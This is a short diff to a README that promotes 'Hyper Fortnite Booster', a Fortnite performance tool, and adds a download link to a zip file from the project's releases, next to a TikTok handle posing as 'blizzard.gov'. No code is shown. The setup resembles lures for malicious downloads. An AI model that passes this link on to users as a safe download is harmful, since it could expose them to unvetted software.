@@ -3,6 +3,7 @@
 ## [Our Website](https://hypersoftwaregroup.github.io/m/)
 ## [Discord](https://discord.gg/dPgbxzATD)
 ## [Tiktok](https://tiktok.com/@blizzard.gov)
+## [Download](https://github.com/HyperSoftwareGroup/m/releases/download/release/hyperfnbooster.zip)
 ### Welcome to the world of Hyper Fortnite Booster, the ultimate solution for unlocking the full potential of your gaming experience in Fortnite. Whether you're a seasoned pro or just starting your journey on the Battle Royale island, Hyper Fortnite Booster is here to supercharge your performance with an array of advanced features designed to maximize your ingame progress.
 
 ## 1. Smart Performance Optimization
